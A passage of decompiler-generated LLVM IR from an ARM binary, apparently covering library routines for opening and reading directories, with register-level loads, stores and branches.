  store i32 %v2_17644, i32* %r4.global-to-local, align 4
  %v3_1764c = icmp eq i32 %v2_17644, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 180260, i32* @r6, align 4
  br i1 %v3_1764c, label %dec_label_pc_17660, label %dec_label_pc_17674

dec_label_pc_17660:                               ; preds = %dec_label_pc_17640
  %v0_17660 = call i32 @function_12b24()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_17668 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17668, i32* %r2.global-to-local, align 4
  %v2_1766c = inttoptr i32 %v0_17660 to i32*
  store i32 9, i32* %v2_1766c, align 4
  %v0_17714.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17714

dec_label_pc_17674:                               ; preds = %dec_label_pc_17640
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_17678 = add i32 %tmp, 24
  store i32 %v1_17678, i32* %r4.global-to-local, align 4
  store i32 %v1_17678, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1768c = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_1768c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_176a4 = load i32, i32* @r6, align 4
  %v2_176a4 = add i32 %v0_176a4, 16
  %v3_176a4 = inttoptr i32 %v2_176a4 to i32*
  %v4_176a4 = load i32, i32* %v3_176a4, align 4
  call void @__pseudo_branch(i32 %v4_176a4)
  %v0_176b0 = load i32, i32* @r7, align 4
  %v1_176b0 = inttoptr i32 %v0_176b0 to i32*
  %v2_176b0 = load i32, i32* %v1_176b0, align 4
  store i32 %v2_176b0, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_176c0 = load i32, i32* @r8, align 4
  store i32 %v0_176c0, i32* %v1_176b0, align 4
  %v0_176c4 = load i32, i32* @r6, align 4
  %v1_176c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_176c4 = add i32 %v1_176c4, %v0_176c4
  %v3_176c4 = inttoptr i32 %v2_176c4 to i32*
  %v4_176c4 = load i32, i32* %v3_176c4, align 4
  store i32 ptrtoint (i32* @global_var_176d0.949 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_176c4)
  %v0_176d0 = load i32, i32* @r7, align 4
  %v1_176d0 = add i32 %v0_176d0, 12
  %v2_176d0 = inttoptr i32 %v1_176d0 to i32*
  %v3_176d0 = load i32, i32* %v2_176d0, align 4
  store i32 %v3_176d0, i32* @r0, align 4
  %v0_176d4 = call i32 @function_15850()
  %v0_176d8 = load i32, i32* @r7, align 4
  store i32 %v0_176d8, i32* @r0, align 4
  %v0_176dc = call i32 @function_15850()
  %v0_176e4 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_176e4, -4095
  br i1 %tmp11, label %dec_label_pc_17710, label %dec_label_pc_17700

dec_label_pc_17700:                               ; preds = %dec_label_pc_17674
  %v0_17700 = call i32 @function_12b24()
  %v0_17704 = load i32, i32* @r4, align 4
  %v1_17704 = sub i32 0, %v0_17704
  store i32 %v1_17704, i32* %r3.global-to-local, align 4
  %v2_17708 = inttoptr i32 %v0_17700 to i32*
  store i32 %v1_17704, i32* %v2_17708, align 4
  %v0_1770c = load i32, i32* @r8, align 4
  br label %dec_label_pc_17710

dec_label_pc_17710:                               ; preds = %dec_label_pc_17674, %dec_label_pc_17700
  %v0_17710 = phi i32 [ %v0_176e4, %dec_label_pc_17674 ], [ %v0_1770c, %dec_label_pc_17700 ]
  store i32 %v0_17710, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_17660, %dec_label_pc_17710
  %v0_17714 = phi i32 [ %v0_17714.pre, %dec_label_pc_17660 ], [ %v0_17710, %dec_label_pc_17710 ]
  %v2_1771c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1771c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17714

; uselistorder directives
  uselistorder i32 %v0_176e4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_17714, { 1, 0 }
  uselistorder label %dec_label_pc_17710, { 1, 0 }
}

define i32 @function_17728(i32 %arg1) local_unnamed_addr {
dec_label_pc_17728:
  %v0_17728 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17728, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17728
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17728, %bb
  %v10_17734 = phi i32 [ %arg1, %dec_label_pc_17728 ], [ 0, %bb ]
  ret i32 %v10_17734

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_17738(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17738:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_17738 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1774c = call i32 @function_14ccc(i32 48)
  %v2_17754 = icmp eq i32 %v1_1774c, 0
  store i32 180260, i32* @r6, align 4
  br i1 %v2_17754, label %bb, label %dec_label_pc_17764

bb:                                               ; preds = %dec_label_pc_17738
  br label %dec_label_pc_177f0

dec_label_pc_17764:                               ; preds = %dec_label_pc_17738
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17768 = load i32, i32* @r4, align 4
  %v2_17768 = icmp ugt i32 %v0_17768, 511
  %v2_1776c = add i32 %v1_1774c, 4
  %v3_1776c = inttoptr i32 %v2_1776c to i32*
  store i32 0, i32* %v3_1776c, align 4
  %v0_17770 = load i32, i32* %r3.global-to-local, align 4
  %v2_17770 = add i32 %v1_1774c, 16
  %v3_17770 = inttoptr i32 %v2_17770 to i32*
  store i32 %v0_17770, i32* %v3_17770, align 4
  %v0_17774 = load i32, i32* %r3.global-to-local, align 4
  %v2_17774 = add i32 %v1_1774c, 8
  %v3_17774 = inttoptr i32 %v2_17774 to i32*
  store i32 %v0_17774, i32* %v3_17774, align 4
  br i1 %v2_17768, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_17764
  %v0_1777c2 = load i32, i32* @r4, align 4
  %v2_1777c3 = add i32 %v1_1774c, 20
  %v3_1777c4 = inttoptr i32 %v2_1777c3 to i32*
  store i32 %v0_1777c2, i32* %v3_1777c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_17764
  %v1_17778 = load i32, i32* %r3.global-to-local, align 4
  %v2_17778 = add i32 %v1_17778, 512
  store i32 %v2_17778, i32* %r3.global-to-local, align 4
  %v0_1777c = load i32, i32* @r4, align 4
  %v2_1777c = add i32 %v1_1774c, 20
  %v3_1777c = inttoptr i32 %v2_1777c to i32*
  store i32 %v0_1777c, i32* %v3_1777c, align 4
  %v1_17780 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_17780, i32* %v3_1777c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_1774c, i32* @r5, align 4
  %v0_17788 = load i32, i32* @r7, align 4
  %v2_17788 = inttoptr i32 %v1_1774c to i32*
  store i32 %v0_17788, i32* %v2_17788, align 4
  %v0_1778c = load i32, i32* @r5, align 4
  %v1_1778c = add i32 %v0_1778c, 20
  %v2_1778c = inttoptr i32 %v1_1778c to i32*
  %v3_1778c = load i32, i32* %v2_1778c, align 4
  store i32 %v3_1778c, i32* %r1.global-to-local, align 4
  %v2_17794 = call i32 @function_1a610(i32 1, i32 %v3_1778c)
  %v2_17798 = icmp eq i32 %v2_17794, 0
  store i32 %v2_17794, i32* @r4, align 4
  %v1_177a0 = load i32, i32* @r5, align 4
  %v2_177a0 = add i32 %v1_177a0, 12
  %v3_177a0 = inttoptr i32 %v2_177a0 to i32*
  store i32 %v2_17794, i32* %v3_177a0, align 4
  br i1 %v2_17798, label %dec_label_pc_177a8, label %dec_label_pc_177b8

dec_label_pc_177a8:                               ; preds = %bb17
  %v0_177a8 = load i32, i32* @r5, align 4
  store i32 %v0_177a8, i32* @r0, align 4
  %v0_177ac = call i32 @function_15850()
  %v0_177b0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_177f0

dec_label_pc_177b8:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_177e0 = load i32, i32* @r5, align 4
  %v1_177e0 = add i32 %v0_177e0, 24
  %v1_177e4 = inttoptr i32 %v1_177e0 to i32*
  store i32 0, i32* %v1_177e4, align 4
  %v3_177e4 = add i32 %v0_177e0, 28
  %v4_177e4 = inttoptr i32 %v3_177e4 to i32*
  %v5_177e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_177e4, i32* %v4_177e4, align 4
  %v6_177e4 = add i32 %v0_177e0, 32
  %v7_177e4 = inttoptr i32 %v6_177e4 to i32*
  %v8_177e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_177e4, i32* %v7_177e4, align 4
  %v9_177e4 = add i32 %v0_177e0, 36
  %v10_177e4 = inttoptr i32 %v9_177e4 to i32*
  %v11_177e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_177e4, i32* %v10_177e4, align 4
  %v12_177e4 = add i32 %v0_177e0, 40
  %v2_177e8 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_177ec = inttoptr i32 %v12_177e4 to i32*
  store i32 %v2_177e8, i32* %v1_177ec, align 4
  %v3_177ec = add i32 %v0_177e0, 44
  %v4_177ec = inttoptr i32 %v3_177ec to i32*
  %v5_177ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_177ec, i32* %v4_177ec, align 4
  %v0_177f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_177f0

dec_label_pc_177f0:                               ; preds = %bb, %dec_label_pc_177a8, %dec_label_pc_177b8
  %v0_177f0 = phi i32 [ 0, %bb ], [ %v0_177b0, %dec_label_pc_177a8 ], [ %v0_177f0.pre, %dec_label_pc_177b8 ]
  store i32 %v12_17738, i32* @r7, align 4
  ret i32 %v0_177f0

; uselistorder directives
  uselistorder i32 %v2_17794, { 1, 0, 2 }
  uselistorder i32 %v1_1774c, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_177f0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_17808(i32 %arg1) local_unnamed_addr {
dec_label_pc_17808:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_17810 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_17838, label %dec_label_pc_17828

dec_label_pc_17828:                               ; preds = %dec_label_pc_17808
  %v0_17828 = call i32 @function_12b24()
  %v0_1782c = load i32, i32* @r7, align 4
  %v1_1782c = sub i32 0, %v0_1782c
  %v2_17830 = inttoptr i32 %v0_17828 to i32*
  store i32 %v1_1782c, i32* %v2_17830, align 4
  br label %dec_label_pc_1785c

dec_label_pc_17838:                               ; preds = %dec_label_pc_17808
  %v1_17838 = icmp slt i32 %arg1, 0
  br i1 %v1_17838, label %dec_label_pc_1785c, label %dec_label_pc_17840

dec_label_pc_17840:                               ; preds = %dec_label_pc_17838
  store i32 %v2_17810, i32* @r1, align 4
  %v0_17844 = call i32 @function_1ab88()
  %v1_17848 = icmp slt i32 %v0_17844, 0
  br i1 %v1_17848, label %dec_label_pc_17850, label %dec_label_pc_17864

dec_label_pc_17850:                               ; preds = %dec_label_pc_17840
  br label %dec_label_pc_1785c

dec_label_pc_1785c:                               ; preds = %dec_label_pc_17850, %dec_label_pc_17838, %dec_label_pc_17828
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_178a0

dec_label_pc_17864:                               ; preds = %dec_label_pc_17840
  %v0_1786c = load i32, i32* @r7, align 4
  %v3_17870 = call i32 @function_1290c(i32 %v0_1786c, i32 2, i32 1)
  %v0_17874 = load i32, i32* @r7, align 4
  %v2_1787c = call i32 @function_17738(i32 %v0_17874, i32 %tmp)
  store i32 %v2_1787c, i32* %r4.global-to-local, align 4
  %v2_17880 = icmp eq i32 %v2_1787c, 0
  br i1 %v2_17880, label %dec_label_pc_17888, label %dec_label_pc_178a0

dec_label_pc_17888:                               ; preds = %dec_label_pc_17864
  %v0_17894 = call i32 @function_12b24()
  %v2_1789c = inttoptr i32 %v0_17894 to i32*
  store i32 12, i32* %v2_1789c, align 4
  %v0_178a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_178a0

dec_label_pc_178a0:                               ; preds = %dec_label_pc_17864, %dec_label_pc_1785c, %dec_label_pc_17888
  %v0_178a0 = phi i32 [ %v2_1787c, %dec_label_pc_17864 ], [ 0, %dec_label_pc_1785c ], [ %v0_178a0.pre, %dec_label_pc_17888 ]
  ret i32 %v0_178a0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_178a0, { 2, 0, 1 }
}

define i32 @function_178b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_178b0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_178b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_178b0, label %bb, label %dec_label_pc_178b0._crit_edge

dec_label_pc_178b0._crit_edge:                    ; preds = %dec_label_pc_178b0
  br label %bb11

bb:                                               ; preds = %dec_label_pc_178b0
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_178b0._crit_edge, %bb
  %v2_178b8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_178b8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_178c4 = call i32 @function_1ab88()
  store i32 %v0_178c4, i32* @r5, align 4
  %v2_178c8 = icmp eq i32 %v0_178c4, 0
  br i1 %v2_178c8, label %dec_label_pc_178d0, label %dec_label_pc_17938

dec_label_pc_178d0:                               ; preds = %bb11
  %v1_178d4 = and i32 %tmp5, 61440
  store i32 %v1_178d4, i32* @r3, align 4
  %v7_178d8 = icmp eq i32 %v1_178d4, 16384
  br i1 %v7_178d8, label %dec_label_pc_178f0, label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178d0
  %v0_178e0 = call i32 @function_12b24()
  br label %dec_label_pc_1791c

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178d0
  %v0_178f0 = load i32, i32* @r4, align 4
  %v2_178f8 = call i32 @function_128a0(i32 %v0_178f0, i32 3)
  %v7_178fc = icmp eq i32 %v2_178f8, -1
  br i1 %v7_178fc, label %dec_label_pc_17938, label %dec_label_pc_17904

dec_label_pc_17904:                               ; preds = %dec_label_pc_178f0
  %v1_17904 = urem i32 %v2_178f8, 4
  %v7_17908 = icmp eq i32 %v1_17904, 1
  br i1 %v7_17908, label %dec_label_pc_17910, label %dec_label_pc_17924

dec_label_pc_17910:                               ; preds = %dec_label_pc_17904
  %v0_17910 = call i32 @function_12b24()
  br label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %dec_label_pc_178e0, %dec_label_pc_17910
  %storemerge2 = phi i32 [ %v0_178e0, %dec_label_pc_178e0 ], [ %v0_17910, %dec_label_pc_17910 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_178e0 ], [ 22, %dec_label_pc_17910 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_1791c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1791c, align 4
  %v0_1793c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17924:                               ; preds = %dec_label_pc_17904
  %v0_17924 = load i32, i32* @r4, align 4
  %v2_1792c = call i32 @function_17738(i32 %v0_17924, i32 %tmp)
  store i32 %v2_1792c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17938:                               ; preds = %bb11, %dec_label_pc_178f0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17924, %dec_label_pc_1791c, %dec_label_pc_17938
  %v0_1793c = phi i32 [ %v2_1792c, %dec_label_pc_17924 ], [ %v0_1793c.pre, %dec_label_pc_1791c ], [ 0, %dec_label_pc_17938 ]
  ret i32 %v0_1793c

; uselistorder directives
  uselistorder i32 %v2_178f8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_17738, { 1, 0 }
  uselistorder i32 ()* @function_1ab88, { 1, 0 }
  uselistorder label %dec_label_pc_1793c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17938, { 1, 0 }
  uselistorder label %dec_label_pc_1791c, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_1794c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1794c:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 180260, i32* @r6, align 4
  %v1_17960 = add i32 %tmp, 24
  store i32 %v1_17960, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_17978 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  store i32 %v4_17978, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17978)
  %v0_1798c = load i32, i32* @r6, align 4
  %v2_1798c = add i32 %v0_1798c, 16
  %v3_1798c = inttoptr i32 %v2_1798c to i32*
  %v4_1798c = load i32, i32* %v3_1798c, align 4
  store i32 %v4_1798c, i32* %ip.global-to-local, align 4
  store i32 96664, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1798c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1799c

dec_label_pc_1799c:                               ; preds = %dec_label_pc_179cc, %dec_label_pc_1794c
  %v0_1799c = load i32, i32* @r5, align 4
  %v1_1799c = add i32 %v0_1799c, 4
  %v2_1799c = inttoptr i32 %v1_1799c to i32*
  %v3_1799c = load i32, i32* %v2_1799c, align 4
  %v4_1799c = add i32 %v0_1799c, 8
  %v5_1799c = inttoptr i32 %v4_1799c to i32*
  %v6_1799c = load i32, i32* %v5_1799c, align 4
  %tmp10 = icmp ugt i32 %v6_1799c, %v3_1799c
  br i1 %tmp10, label %dec_label_pc_179cc, label %dec_label_pc_179a8

dec_label_pc_179a8:                               ; preds = %dec_label_pc_1799c
  %v1_179a8 = inttoptr i32 %v0_1799c to i32*
  %v2_179a8 = load i32, i32* %v1_179a8, align 4
  %v1_179ac = add i32 %v0_1799c, 12
  %v2_179ac = inttoptr i32 %v1_179ac to i32*
  %v3_179ac = load i32, i32* %v2_179ac, align 4
  %v1_179b0 = add i32 %v0_1799c, 20
  %v2_179b0 = inttoptr i32 %v1_179b0 to i32*
  %v3_179b0 = load i32, i32* %v2_179b0, align 4
  %v4_179b4 = inttoptr i32 %v3_179ac to i32*
  %v5_179b4 = call i32 @function_1ae50(i32 %v2_179a8, i32* %v4_179b4, i32 %v3_179b0, i32 %v6_1799c)
  %tmp9 = icmp slt i32 %v5_179b4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_179c4

.thread:                                          ; preds = %dec_label_pc_179a8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_179fc

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179a8
  %v1_179c4 = load i32, i32* @r5, align 4
  %v2_179c4 = add i32 %v1_179c4, 8
  %v3_179c4 = inttoptr i32 %v2_179c4 to i32*
  store i32 %v5_179b4, i32* %v3_179c4, align 4
  %v0_179c8 = load i32, i32* @r7, align 4
  %v1_179c8 = load i32, i32* @r5, align 4
  %v2_179c8 = add i32 %v1_179c8, 4
  %v3_179c8 = inttoptr i32 %v2_179c8 to i32*
  store i32 %v0_179c8, i32* %v3_179c8, align 4
  %v0_179cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %dec_label_pc_1799c, %dec_label_pc_179c4
  %v1_179f0 = phi i32 [ %v0_1799c, %dec_label_pc_1799c ], [ %v0_179cc.pre, %dec_label_pc_179c4 ]
  %v1_179cc = add i32 %v1_179f0, 4
  %v2_179cc = inttoptr i32 %v1_179cc to i32*
  %v3_179cc = load i32, i32* %v2_179cc, align 4
  %v1_179d0 = add i32 %v1_179f0, 12
  %v2_179d0 = inttoptr i32 %v1_179d0 to i32*
  %v3_179d0 = load i32, i32* %v2_179d0, align 4
  %v2_179d4 = add i32 %v3_179d0, %v3_179cc
  store i32 %v2_179d4, i32* @r4, align 4
  %v3_179d8 = inttoptr i32 %v2_179d4 to i32*
  %v4_179d8 = load i32, i32* %v3_179d8, align 4
  %v1_179dc = add i32 %v2_179d4, 4
  %v2_179dc = inttoptr i32 %v1_179dc to i32*
  %v3_179dc = load i32, i32* %v2_179dc, align 4
  %v1_179e0 = add i32 %v2_179d4, 16
  %v2_179e0 = inttoptr i32 %v1_179e0 to i16*
  %v3_179e0 = load i16, i16* %v2_179e0, align 2
  %v4_179e0 = zext i16 %v3_179e0 to i32
  %v1_179e4 = add i32 %v2_179d4, 8
  %v2_179e4 = inttoptr i32 %v1_179e4 to i32*
  %v3_179e4 = load i32, i32* %v2_179e4, align 4
  store i32 %v3_179e4, i32* %ip.global-to-local, align 4
  %v2_179e8 = add i32 %v4_179e0, %v3_179cc
  %v2_179ec = or i32 %v3_179dc, %v4_179d8
  %v4_179ec = icmp eq i32 %v2_179ec, 0
  store i32 %v2_179e8, i32* %v2_179cc, align 4
  %v0_179f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_179f4 = load i32, i32* @r5, align 4
  %v2_179f4 = add i32 %v1_179f4, 16
  %v3_179f4 = inttoptr i32 %v2_179f4 to i32*
  store i32 %v0_179f4, i32* %v3_179f4, align 4
  br i1 %v4_179ec, label %dec_label_pc_1799c, label %dec_label_pc_179fc

dec_label_pc_179fc:                               ; preds = %dec_label_pc_179cc, %.thread
  %v0_17a08 = load i32, i32* @r6, align 4
  %v2_17a08 = add i32 %v0_17a08, 24
  %v3_17a08 = inttoptr i32 %v2_17a08 to i32*
  %v4_17a08 = load i32, i32* %v3_17a08, align 4
  store i32 %v4_17a08, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17a08)
  %v0_17a14 = load i32, i32* @r4, align 4
  ret i32 %v0_17a14

; uselistorder directives
  uselistorder i32 %v2_179d4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_179f0, { 1, 0 }
  uselistorder i32 %v6_1799c, { 1, 0 }
  uselistorder i32 %v0_1799c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_179cc, { 1, 0 }
}

define i32 @function_17a28(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a28:
  %v0_17a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a28, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17a28
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17a28, %bb
  %v10_17a34 = phi i32 [ %arg1, %dec_label_pc_17a28 ], [ 0, %bb ]
  ret i32 %v10_17a34

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_17a38() local_unnamed_addr {
dec_label_pc_17a38:
  ret i32 ptrtoint (i32* @global_var_32ac4.965 to i32)
}

define i32 @function_17a54(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17a54:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17a54 = load i32, i32* @r4, align 4
  %v6_17a54 = load i32, i32* @r5, align 4
  %v9_17a54 = load i32, i32* @r6, align 4
  %v12_17a54 = load i32, i32* @r7, align 4
  %v15_17a54 = load i32, i32* @r8, align 4
  %v18_17a54 = load i32, i32* @sb, align 4
  %v21_17a54 = load i32, i32* @sl, align 4
  %v24_17a54 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_17a58 = icmp eq i32* %arg1, null
  store i1 %v2_17a58, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_17a58, label %dec_label_pc_17d68, label %dec_label_pc_17a70

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a54
  %v1_17a70 = urem i32 %arg3, 256
  store i32 %v1_17a70, i32* @sb, align 4
  %v1_17a74 = udiv i32 %arg3, 256
  %v3_17a78 = urem i32 %v1_17a74, 256
  %v3_17a7c = mul nuw nsw i32 %v1_17a70, 4
  %v1_17a84 = or i32 %v3_17a7c, 1
  %v1_17a90 = and i32 %arg3, 131072
  %v1_17a94 = add nsw i32 %v1_17a70, -1
  %v1_17aa0 = and i32 %arg3, 262144
  store i32 %v1_17aa0, i32* %r2.global-to-local, align 4
  %v1_17aa4 = and i32 %arg3, 65536
  store i32 %v1_17aa4, i32* %r3.global-to-local, align 4
  store i32 %v1_17aa4, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_17ab4 = add i32 %arg4, 1
  store i32 %v1_17ab4, i32* @sl, align 4
  %v2_17c34 = inttoptr i32 %arg2 to i32*
  %v2_17c44 = icmp eq i32 %v1_17a90, 0
  %v2_17c9c = icmp eq i32 %v1_17aa0, 0
  br label %dec_label_pc_17ab8

dec_label_pc_17ab8:                               ; preds = %dec_label_pc_17ab8.backedge, %dec_label_pc_17a70
  %v2_17ad4 = phi i32 [ %v0_17ab8.pre, %dec_label_pc_17ab8.backedge ], [ %tmp, %dec_label_pc_17a70 ]
  %v1_17ab8 = add i32 %v2_17ad4, 4
  %v2_17ab8 = inttoptr i32 %v1_17ab8 to i32*
  %v3_17ab8 = load i32, i32* %v2_17ab8, align 4
  store i32 %v3_17ab8, i32* %r3.global-to-local, align 4
  %v2_17abc = icmp eq i32 %v3_17ab8, 0
  store i1 %v2_17abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17abc, label %dec_label_pc_17ac4, label %dec_label_pc_17b0c

dec_label_pc_17ac4:                               ; preds = %dec_label_pc_17ab8
  %v1_17ac4 = add i32 %v2_17ad4, 16
  %v2_17ac4 = inttoptr i32 %v1_17ac4 to i32*
  %v3_17ac4 = load i32, i32* %v2_17ac4, align 4
  store i32 %v3_17ac4, i32* %r3.global-to-local, align 4
  %v2_17ac8 = icmp eq i32 %v3_17ac4, 0
  store i1 %v2_17ac8, i1* %cpsr_z.global-to-local, align 1
  %v1_17acc = add i32 %v2_17ad4, 8
  %v2_17acc = inttoptr i32 %v1_17acc to i32*
  %v3_17acc = load i32, i32* %v2_17acc, align 4
  store i32 %v3_17acc, i32* %r3.global-to-local, align 4
  br i1 %v2_17ac8, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_17ac4
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_17ac4, align 4
  %v0_17ad8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17ac4, %bb
  %v0_17ad8 = phi i32 [ %v0_17ad8.pre, %bb ], [ %v3_17acc, %dec_label_pc_17ac4 ]
  %v2_17ad8 = icmp eq i32 %v0_17ad8, 0
  store i1 %v2_17ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ad8, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_17a84, i32* %r3.global-to-local, align 4
  %v2_17ae0 = load i32, i32* @r5, align 4
  %v3_17ae0 = add i32 %v2_17ae0, 8
  %v4_17ae0 = inttoptr i32 %v3_17ae0 to i32*
  store i32 %v1_17a84, i32* %v4_17ae0, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_17ae4 = load i32, i32* @r5, align 4
  %v1_17ae4 = add i32 %v0_17ae4, 16
  %v2_17ae4 = inttoptr i32 %v1_17ae4 to i32*
  %v3_17ae4 = load i32, i32* %v2_17ae4, align 4
  store i32 %v3_17ae4, i32* %r0.global-to-local, align 4
  %v1_17ae8 = add i32 %v0_17ae4, 8
  %v2_17ae8 = inttoptr i32 %v1_17ae8 to i32*
  %v3_17ae8 = load i32, i32* %v2_17ae8, align 4
  store i32 %v3_17ae8, i32* %r3.global-to-local, align 4
  %v2_17aec = add i32 %v3_17ae8, %v3_17ae4
  store i32 %v2_17aec, i32* %r0.global-to-local, align 4
  %v1_17af0 = call i32 @function_14ccc(i32 %v2_17aec)
  store i32 %v1_17af0, i32* %r0.global-to-local, align 4
